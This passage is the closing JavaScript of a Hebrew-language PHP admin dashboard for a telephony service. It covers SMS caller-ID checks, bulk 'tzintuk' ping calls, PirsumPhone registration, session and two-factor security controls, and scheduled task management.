            html += `<li><i class="fa fa-font"></i> <span>זיהוי טקסטואלי:</span> <strong>${data.sms.allowText ? '<span style="color:green">מאושר</span>' : '<span style="color:red">לא מאושר</span>'}</strong></li>`;
            html += '</ul>';
            container.innerHTML = html;
        } else {
             container.innerHTML = `<p class="message error">שגיאה בטעינת זיהויים: ${data.message || 'תקלה לא ידועה'}</p>`;
        }
    }
    async function handleCheckSmsCallerId() {
        const container = document.getElementById('check-sms-callerid-result');
        const callerIdToCheck = document.getElementById('check-sms-callerid-input').value;
        if (!callerIdToCheck) {
            alert('יש להזין זיהוי לבדיקה.');
            return;
        }
        container.innerHTML = `<p>בודק את ${callerIdToCheck}...</p>`;
        const data = await apiCall('IsCallerIDApproved', { callerId: callerIdToCheck, serviceType: 'sms' });

        if (data && data.responseStatus === 'OK') {
            if (data.isApproved) {
                container.innerHTML = `<div class="message success">הזיהוי <strong>${callerIdToCheck}</strong> מאושר לשליחת SMS.</div>`;
            } else {
                container.innerHTML = `<div class="message error">הזיהוי <strong>${callerIdToCheck}</strong> אינו מאושר.<br>סיבה: ${data.reason}</div>`;
            }
        } else {
            container.innerHTML = `<p class="message error">שגיאה בבדיקה: ${data.message || 'תקלה לא ידועה'}</p>`;
        }
    }

    // --- Tzintukim Functions ---
    let selectedCallerIdType = 'custom'; 
    function selectCallerIdOption(btnElement, type) {
        document.querySelectorAll('.caller-id-option-btn').forEach(btn => btn.classList.remove('active'));
        btnElement.classList.add('active');
        selectedCallerIdType = type;
        const inputContainer = document.getElementById('tz-callerId-input-container');
        if (type === 'custom') {
            inputContainer.style.display = 'block';
        } else {
            inputContainer.style.display = 'none';
        }
    }
    function handleTzintukFileUpload(event) {
        const file = event.target.files[0];
        if (!file) return;
        const reader = new FileReader();
        reader.onload = function(e) {
            const content = e.target.result;
            const numbers = content.replace(/,/g, '\n').split('\n').map(n => n.trim()).filter(n => n);
            const phonesTextarea = document.getElementById('tz-phones');
            phonesTextarea.value = (phonesTextarea.value ? phonesTextarea.value + '\n' : '') + numbers.join('\n');
            alert(`${numbers.length} מספרים נטענו מהקובץ.`);
        };
        reader.onerror = function() { alert('שגיאה בקריאת הקובץ.'); };
        reader.readAsText(file);
        event.target.value = '';
    }
    async function handleRunTzintuk(){
        const container = document.getElementById('tz-results-container');
        const params = {
            TzintukTimeOut: document.getElementById('tz-timeout').value,
            phones: document.getElementById('tz-phones').value
        };
        if (selectedCallerIdType === 'rand') { params.callerId = 'RAND'; } else { params.callerId = document.getElementById('tz-callerId-input').value; }
        if(!params.phones){ alert('יש להזין מספרים או רשימה.'); return; }
        container.innerHTML = '<p>שולח צינתוק...</p>';
        const data = await apiCall('run_tzintuk', params);
        if(data && data.responseStatus === 'OK'){
            let html = `<div class="message success">הצלחה! ${data.callsCount} שיחות יוצאות. עלות: ${data.biling} יחידות.</div>`;
            if(data.errors && Object.keys(data.errors).length > 0){
                html += `<h4>שגיאות:</h4><ul class="details-list">`;
                for(const phone in data.errors){ html += `<li><strong>${phone}:</strong> ${data.errors[phone]}</li>`; }
                html += `</ul>`;
            }
            container.innerHTML = html;
        } else { container.innerHTML = `<p class="message error">שגיאה: ${data.message || 'תקלה לא ידועה'}</p>`; }
    }
    async function loadTzintukLists(){
        const container = document.getElementById('tz-lists-container');
        container.innerHTML = '<p>טוען רשימות...</p>';
        const data = await apiCall('tzintukim_list_management', {action: 'getlists'});
        if(data && data.responseStatus === 'OK'){
            if(!data.lists || data.lists.length === 0){ container.innerHTML = '<p>לא נמצאו רשימות צינתוקים.</p>'; return; }
            let html = '<table><thead><tr><th>שם רשימה</th><th>רשומים</th><th>פעולות</th></tr></thead><tbody>';
            data.lists.forEach(list => {
                html += `<tr><td data-label="שם">${list.listName}</td><td data-label="רשומים">${list.subscribers}</td>
                <td data-label="פעולות" class="task-actions">
                    <button class="button" style="background-color:var(--success-color);" onclick="runTzintukForList('${list.listName}')" title="הפעל צינתוק לרשימה"><i class="fa fa-play"></i></button>
                    <button class="button" style="background-color:var(--primary-color);" onclick="viewTzintukListSubscribers('${list.listName}')" title="הצג רשומים"><i class="fa fa-users"></i></button>
                    <button class="button" style="background-color:var(--info-color);" onclick="viewTzintukListLog('${list.listName}')" title="הצג לוג"><i class="fa fa-history"></i></button>
                    <button class="button" style="background-color:var(--danger-color);" onclick="resetTzintukList('${list.listName}')" title="אפס רשימה"><i class="fa fa-undo"></i></button>
                </td></tr>`;
            });
            container.innerHTML = html + '</tbody></table>';
        } else { container.innerHTML = `<p class="message error">שגיאה: ${data.message || 'לא ניתן לטעון רשימות'}</p>`; }
    }
    async function runTzintukForList(listName) {
        const callerId = prompt("הזן מספר זיהוי יוצא (או השאר ריק לשימוש בברירת המחדל של המערכת):", "");
        if (callerId === null) return; 
        if (confirm(`האם להפעיל צינתוק לרשימה '${listName}'?`)) {
            const params = { phones: `tzl:${listName}` };
            if (callerId) params.callerId = callerId;
            const container = document.getElementById('tz-results-container');
            container.innerHTML = `<p>שולח צינתוק לרשימה ${listName}...</p>`;
            const data = await apiCall('run_tzintuk', params);
            if (data && data.responseStatus === 'OK') {
                let html = `<div class="message success">הצלחה! ${data.callsCount} שיחות יוצאות לרשימה '${listName}'. עלות: ${data.biling} יחידות.</div>`;
                if (data.errors && Object.keys(data.errors).length > 0) {
                    html += `<h4>שגיאות:</h4><ul class="details-list">`;
                    for (const phone in data.errors) { html += `<li><strong>${phone}:</strong> ${data.errors[phone]}</li>`; }
                    html += `</ul>`;
                }
                container.innerHTML = html;
            } else { container.innerHTML = `<p class="message error">שגיאה בהפעלת הצינתוק: ${data.message || 'תקלה לא ידועה'}</p>`; }
        }
    }
    async function viewTzintukListSubscribers(listName){
        const modal = document.getElementById('logs-modal');
        const content = document.getElementById('logs-content');
        document.getElementById('logs-modal-title').innerText = `רשומים לרשימה: ${listName}`;
        content.innerHTML = '<p>טוען...</p>';
        modal.style.display = 'flex';
        const data = await apiCall('tzintukim_list_management', {action: 'getlistEnteres', TzintukimList: listName});
        if(data && data.responseStatus === 'OK'){
            if(!data.enteres || data.enteres.length === 0){ content.innerHTML = '<p>אין רשומים ברשימה זו.</p>'; return; }
            let html = `<table><thead><tr><th>טלפון</th><th>שם</th></tr></thead><tbody>`;
            data.enteres.forEach(e => { html += `<tr><td data-label="טלפון">${e.phone}</td><td data-label="שם">${e.name || ''}</td></tr>`; });
            content.innerHTML = html + '</tbody></table>';
        } else { content.innerHTML = `<p class="message error">שגיאה: ${data.message || 'תקלה לא ידועה'}</p>`; }
    }
    async function viewTzintukListLog(listName){
        const modal = document.getElementById('logs-modal');
        const content = document.getElementById('logs-content');
        document.getElementById('logs-modal-title').innerText = `לוג לרשימה: ${listName}`;
        content.innerHTML = '<p>טוען...</p>';
        modal.style.display = 'flex';
        const data = await apiCall('tzintukim_list_management', {action: 'getLogList', TzintukimList: listName});
        if(data && data.responseStatus === 'OK'){
            if(!data.events || data.events.length === 0){ content.innerHTML = '<p>אין אירועים בלוג.</p>'; return; }
            let html = `<table><thead><tr><th>תאריך</th><th>שעה</th><th>טלפון</th><th>פעולה</th></tr></thead><tbody>`;
            data.events.forEach(e => { html += `<tr><td data-label="תאריך">${e.Date}</td><td data-label="שעה">${e.Time}</td><td data-label="טלפון">${e.Phone}</td><td data-label="פעולה">${e.TypeOperation} ${e.PhoneAction || ''}</td></tr>`; });
            content.innerHTML = html + '</tbody></table>';
        } else { content.innerHTML = `<p class="message error">שגיאה: ${data.message || 'תקלה לא ידועה'}</p>`; }
    }
    async function resetTzintukList(listName){
        if(confirm(`האם אתה בטוח שברצונך לאפס את כל הרשומים ברשימה ${listName}? פעולה זו אינה הפיכה.`)){
            const data = await apiCall('tzintukim_list_management', {action: 'resetList', TzintukimList: listName});
            if(data && data.responseStatus === 'OK'){ alert('הרשימה אופסה בהצלחה.'); loadTzintukLists(); }
            else { alert(`שגיאה באיפוס הרשימה: ${data.message || 'תקלה לא ידועה'}`); }
        }
    }

    // --- PirsumPhone Functions ---
    async function loadPirsumphoneStatus() {
        const container = document.getElementById('pirsumphone-status-container');
        container.innerHTML = '<p>בודק סטטוס רישום...</p>';
        const data = await apiCall('PirsumPhoneManagement', { action: 'GetRegistrationStatus' });
        if (data && data.responseStatus === 'OK') {
            const isRegistered = data.registrationStatus;
            let html = `<h3>סטטוס נוכחי: <strong>${isRegistered ? '<span style="color:var(--success-color)">רשום לשירות</span>' : '<span style="color:var(--danger-color)">לא רשום לשירות</span>'}</strong></h3>`;
            if (isRegistered) {
                html += `<p>המערכת שלך רשומה לשירות הפרסומפון.</p><button class="button" style="background-color:var(--danger-color);" onclick="handlePirsumphoneUnregister()">הסר רישום מהשירות</button>`;
            } else {
                html += `<p>באפשרותך להירשם לשירות הפרסומפון כדי לאפשר פרסום של המערכת שלך.</p><button class="button" style="background-color:var(--success-color);" onclick="handlePirsumphoneRegister()">רשום אותי לשירות</button>`;
            }
            container.innerHTML = html;
        } else {
            container.innerHTML = `<p class="message error">שגיאה בבדיקת הסטטוס: ${data.message || 'תקלה לא ידועה'}</p>`;
        }
    }
    async function handlePirsumphoneRegister() {
        if(confirm('האם אתה בטוח שברצונך לרשום את המערכת לשירות הפרסומפון?')) {
            const data = await apiCall('PirsumPhoneManagement', { action: 'Registration' });
            if(data && data.responseStatus === 'OK') {
                alert('הרישום בוצע בהצלחה!');
            } else {
                alert(`שגיאה ברישום: ${data.message || 'תקלה לא ידועה'}`);
            }
            loadPirsumphoneStatus();
        }
    }
    async function handlePirsumphoneUnregister() {
        if(confirm('האם אתה בטוח שברצונך להסיר את המערכת משירות הפרסומפון?')) {
            const data = await apiCall('PirsumPhoneManagement', { action: 'UnRegistration' });
            if(data && data.responseStatus === 'OK') {
                alert('הרישום הוסר בהצלחה!');
            } else {
                alert(`שגיאה בהסרת הרישום: ${data.message || 'תקלה לא ידועה'}`);
            }
            loadPirsumphoneStatus();
        }
    }

    // --- Security Functions ---
    async function loadSecurityInfo(){
        const statusContainer = document.getElementById('security-status-container');
        const actionsContainer = document.getElementById('security-actions-container');
        statusContainer.innerHTML = '<p>טוען מידע אבטחה...</p>';
        const data = await apiCall('validation_token');
        if(data && data.responseStatus === 'OK' && data.tokenData){
            const td = data.tokenData;
            const isVerified = td.doubleAuthStatus;
            let statusHtml = `<h3>מצב חיבור נוכחי</h3><ul class="details-list">
                <li><i class="fa-solid fa-key"></i> <span>טוקן:</span> <strong>${td.token}</strong></li>
                <li><i class="fa-solid fa-server"></i> <span>סוג חיבור:</span> <strong>${td.sessionType}</strong></li>
                <li><i class="fa-solid fa-clock"></i> <span>זמן יצירה:</span> <strong>${td.createTime}</strong></li>
                <li><i class="fa-solid fa-network-wired"></i> <span>כתובת IP:</span> <strong>${td.remoteIP}</strong></li>
                <li><i class="fa-solid fa-shield-halved"></i> <span>אימות דו-שלבי:</span> <strong>${isVerified ? '<span style="color:var(--success-color)">מאומת</span>' : '<span style="color:var(--danger-color)">לא מאומת</span>'}</strong></li>
            </ul>`;
            statusContainer.innerHTML = statusHtml;

            let actionsHtml = `<div><h3>אימות דו-שלבי (2FA)</h3>
                <div id="2fa-form">
                    <button class="button" style="background-color:var(--primary-color);" onclick="handleSend2FA()"><i class="fa-solid fa-phone-volume"></i> שלח שיחת אימות</button>
                    <div id="2fa-verify-section" style="display:none; margin-top:15px;">
                        <p id="2fa-message"></p>
                        <div class="form-group"><label>קוד 4 ספרות:</label><input type="number" id="2fa-code-input"></div>
                        <button class="button" style="background-color:var(--success-color);" onclick="handleVerify2FA()">אמת קוד</button>
                    </div>
                </div></div>`;
            
            actionsHtml += `<div><h3>פעולות מאובטחות</h3>
                <button class="button" style="background-color:var(--info-color);" onclick="handleGetLoginLog()" ${!isVerified ? 'disabled' : ''}><i class="fa-solid fa-clipboard-list"></i> הצג לוג התחברויות</button>
                <button class="button" style="background-color:var(--info-color);" onclick="handleGetAllSessions()" ${!isVerified ? 'disabled' : ''} style="margin-top:10px;"><i class="fa-solid fa-users"></i> הצג חיבורים פעילים</button>
                <button class="button" onclick="handleKillAllSessions()" ${!isVerified ? 'disabled' : ''} style="background-color:var(--danger-color); margin-top:10px;"><i class="fa-solid fa-user-slash"></i> נתק את כל החיבורים</button>
                ${!isVerified ? '<p class="message error" style="font-size:0.9em; padding:8px; margin-top:10px;">נדרש אימות דו-שלבי כדי להשתמש בפעולות אלו.</p>' : ''}
            </div>`;
            actionsContainer.innerHTML = actionsHtml;

        } else {
            statusContainer.innerHTML = `<p class="message error">שגיאה בטעינת מידע: ${data.message || 'תקלה לא ידועה'}</p>`;
        }
    }
    async function handleSend2FA(){
        const data = await apiCall('double_auth', {action: 'SendCode'});
        if(data && data.responseStatus === 'OK'){
            document.getElementById('2fa-verify-section').style.display = 'block';
            document.getElementById('2fa-message').innerText = `שיחה נשלחה למספר המזוהה במערכת. 4 ספרות אחרונות: ${data.LastNumberToSend}.`;
        } else { alert(`שגיאה בשליחת שיחה: ${data.message}`); }
    }
    async function handleVerify2FA(){
        const code = document.getElementById('2fa-code-input').value;
        if(!code || code.length !== 4){ alert('יש להזין קוד בן 4 ספרות.'); return; }
        const data = await apiCall('double_auth', {action: 'VerifyCode', code});
        if(data && data.responseStatus === 'OK'){
            alert('האימות הושלם בהצלחה!');
            loadSecurityInfo(); 
        } else { alert(`שגיאה באימות: ${data.message}`); }
    }
    async function handleGetLoginLog() {
        const resultsContainer = document.getElementById('security-results-container');
        resultsContainer.innerHTML = '<h3>לוג התחברויות</h3><p>טוען לוג...</p>';
        const data = await apiCall('get_login_log', {limit: 50});
        if(data && data.responseStatus === 'OK'){
            if(!data.data || data.data.length === 0) { resultsContainer.innerHTML += '<p>אין נתוני לוג.</p>'; return; }
            let html = '<table><thead><tr><th>זמן</th><th>משתמש</th><th>IP</th><th>סוג</th><th>סטטוס</th></tr></thead><tbody>';
            data.data.forEach(log => {
                html += `<tr><td data-label="זמן">${log.actionTimestamp}</td><td data-label="משתמש">${log.username}</td><td data-label="IP">${log.remoteIP}</td><td data-label="סוג">${log.sessionType}</td><td data-label="סטטוס">${log.successful ? '<span style="color:green">הצלחה</span>' : '<span style="color:red">כישלון</span>'}</td></tr>`;
            });
            resultsContainer.innerHTML += html + '</tbody></table>';
        } else { resultsContainer.innerHTML += `<p class="message error">${data.message}</p>`; }
    }
    async function handleGetAllSessions(){
        const resultsContainer = document.getElementById('security-results-container');
        resultsContainer.innerHTML = '<h3>חיבורים פעילים</h3><p>טוען...</p>';
        const data = await apiCall('get_all_sessions');
        if(data && data.responseStatus === 'OK'){
            if(!data.sessions || data.sessions.length === 0) { resultsContainer.innerHTML += '<p>אין חיבורים פעילים.</p>'; return; }
            let html = `<table><thead><tr><th>ID</th><th>טוקן</th><th>IP</th><th>סוג</th><th>נוצר</th><th>מאומת</th><th>פעולה</th></tr></thead><tbody>`;
            data.sessions.forEach(s => {
                html += `<tr><td data-label="ID">${s.id}</td><td data-label="טוקן">${s.token}</td><td data-label="IP">${s.remoteIP}</td><td data-label="סוג">${s.sessionType}</td><td data-label="נוצר">${s.createTime}</td><td data-label="מאומת">${s.doubleAuthStatus ? 'כן' : 'לא'}</td><td data-label="פעולה"><button class="button" style="background-color:var(--danger-color); padding:5px 10px;" onclick="handleKillSession(${s.id})">נתק</button></td></tr>`;
            });
            resultsContainer.innerHTML += html + '</tbody></table>';
        } else { resultsContainer.innerHTML += `<p class="message error">${data.message}</p>`; }
    }
    async function handleKillSession(sessionId) {
        if(confirm(`האם אתה בטוח שברצונך לנתק את חיבור ${sessionId}?`)){
            const data = await apiCall('kill_session', {SessionId: sessionId});
            if(data && data.responseStatus === 'OK'){ alert(`חיבור ${data.SessionId} נותק בהצלחה.`); handleGetAllSessions(); }
            else { alert(`שגיאה: ${data.message}`); }
        }
    }
    async function handleKillAllSessions() {
        if(confirm('אזהרה! פעולה זו תנתק את כל החיבורים למערכת, כולל החיבור הנוכחי שלך. האם להמשיך?')){
            const data = await apiCall('kill_all_sessions');
            if(data && data.responseStatus === 'OK'){ alert(`${data.KillSessions} חיבורים נותקו. הדף יטען מחדש.`); window.location.reload(); }
            else { alert(`שגיאה: ${data.message}`); }
        }
    }

    (function pasteExistingTaskFunctionsHere() {
        async function loadTasks() {
            const container = document.getElementById('taskListContainer');
            container.innerHTML = '<p>טוען משימות...</p>';
            const data = await apiCall('get_tasks');
            if (data && data.responseStatus === 'OK') {
                if (!data.tasks || data.tasks.length === 0) { container.innerHTML = '<p>לא נמצאו משימות.</p>'; return; }
                let html = `<table><thead><tr class="header-row"><th>סטטוס</th><th>תיאור</th><th>סוג</th><th>ריצה הבאה</th><th>פעולות</th></tr></thead><tbody>`;
                data.tasks.forEach(task => {
                    html += `<tr>
                        <td data-label="סטטוס"><span class="status-icon ${task.active ? 'active' : 'inactive'}" title="${task.active ? 'פעיל' : 'לא פעיל'}">●</span></td>
                        <td data-label="תיאור">${task.description || ''}</td><td data-label="סוג">${task.type || ''}</td>
                        <td data-label="ריצה הבאה">${task.nextRun || 'לא מוגדר'}</td>
                        <td data-label="פעולות" class="task-actions">
                            <button class="button" onclick="openTaskModal(${task.id})" style="background-color: var(--primary-color);"><i class="fa-solid fa-edit"></i></button>
                            <button class="button" onclick="viewTaskLogs(${task.id})" style="background-color: var(--info-color);"><i class="fa-solid fa-history"></i></button>
                            <button class="button" onclick="deleteTask(${task.id})" style="background-color: var(--danger-color);"><i class="fa-solid fa-trash"></i></button>
                        </td></tr>`;
                });
                container.innerHTML = html + `</tbody></table>`;
            } else if (data.responseStatus !== 'ERROR') {
                 container.innerHTML = `<p class="message error">שגיאה בטעינת המשימות: ${data.message || 'תגובה לא ידועה'}</p>`;
            }
        }
        window.loadTasks = loadTasks;
        function toggleTaskFields() { const type = document.getElementById('task-type').value; document.querySelectorAll('.task-type-fields').forEach(fs => fs.style.display = fs.dataset.type === type ? 'block' : 'none'); }
        window.toggleTaskFields = toggleTaskFields;
        async function openTaskModal(taskId = null) {
            const form = document.getElementById('task-form'); form.reset(); document.getElementById('TaskId').value = ''; toggleTaskFields();
            const modal = document.getElementById('task-modal'); document.getElementById('task-modal-title').textContent = taskId ? 'עריכת משימה' : 'יצירת משימה חדשה';
            if (taskId) {
                const data = await apiCall('get_task_details', { TaskId: taskId });
                if (data && data.responseStatus === 'OK') {
                    const task = data;
                    form.elements.TaskId.value = task.id; form.elements.description.value = task.description || ''; form.elements.taskType.value = task.type || '';
                    toggleTaskFields();
                    form.elements.active.checked = task.active == 1; form.elements.mailInEnd.checked = task.sendMailInEnd == 1; form.elements.mailInError.checked = task.sendMailInError == 1;
                    form.elements.minute.value = task.minute; form.elements.hour.value = task.hour; form.elements.day.value = task.day; form.elements.month.value = task.month; form.elements.year.value = task.year;
                    if (task.days_of_week) { const days = task.days_of_week.split(','); form.querySelectorAll('input[name="days"]').forEach(cb => cb.checked = days.includes(cb.value)); }
                    try { if (task.action_data) { const actionData = JSON.parse(task.action_data); for(const key in actionData) if(form.elements[key]) form.elements[key].value = actionData[key]; } } catch(e) { console.error("Could not parse action_data", e); }
                } else { alert('שגיאה בטעינת פרטי המשימה.'); return; }
            }
            modal.style.display = 'flex';
        }
        window.openTaskModal = openTaskModal;
        function closeTaskModal() { document.getElementById('task-modal').style.display = 'none'; }
        window.closeTaskModal = closeTaskModal;
        async function handleTaskFormSubmit(event) {
            event.preventDefault(); const form = event.target; const params = Object.fromEntries(new FormData(form).entries());
            let days = {}; for(let i=0; i<=6; i++) days[i] = 0; form.querySelectorAll('input[name="days"]:checked').forEach(cb => days[cb.value] = 1);
            params.days = JSON.stringify(days);
            ['active', 'checkIsKodesh', 'mailInEnd', 'mailInError', 'ifAnyDay'].forEach(name => { params[name] = form.elements[name] && form.elements[name].checked ? '1' : '0'; });
            const action = params.TaskId ? 'update_task' : 'create_task';
            const result = await apiCall(action, params);
            if (result && (result.responseStatus === 'OK' || result.status === true)) { alert('המשימה נשמרה בהצלחה!'); closeTaskModal(); loadTasks(); }
            else { alert(`שגיאה בשמירת המשימה: ${result.message || 'תקלה לא ידועה'}`); }
        }
        window.handleTaskFormSubmit = handleTaskFormSubmit;
        async function viewTaskLogs(taskId) {
            const modal = document.getElementById('logs-modal'); const content = document.getElementById('logs-content');
            document.getElementById('logs-modal-title').innerText = `לוגים למשימה: ${taskId}`; content.innerHTML = '<p>טוען...</p>'; modal.style.display = 'flex';
            const data = await apiCall('get_task_logs', { TaskId: taskId });
            if (data && data.responseStatus === 'OK') {
                if (!data.logs || data.logs.length === 0) { content.innerHTML = '<p>אין אירועים בלוג.</p>'; return; }
                let html = '<table><thead><tr><th>זמן</th><th>סטטוס</th><th>הודעה</th></tr></thead><tbody>';
                data.logs.forEach(log => { html += `<tr><td data-label="זמן">${log.ts}</td><td data-label="סטטוס">${log.succeeded == 1 ? '<span style="color:green">הצלחה</span>' : '<span style="color:red">כישלון</span>'}</td><td data-label="הודעה" style="word-break:break-all;">${log.error_message || ''}</td></tr>`; });
                content.innerHTML = html + '</tbody></table>';
            } else { content.innerHTML = `<p class="message error">שגיאה: ${data.message}</p>`; }
        }
        window.viewTaskLogs = viewTaskLogs;
        async function deleteTask(taskId) {
            if (confirm('האם אתה בטוח שברצונך למחוק את המשימה?')) {
                const result = await apiCall('delete_task', { TaskId: taskId });
                if (result && result.status > 0) { alert('המשימה נמחקה בהצלחה.'); loadTasks(); }
                else { alert(`שגיאה במחיקת המשימה: ${result.message || 'תקלה לא ידועה'}`); }
            }
        }
        window.deleteTask = deleteTask;
    })();
    <?php endif; ?>
</script>
</body>
</html>
```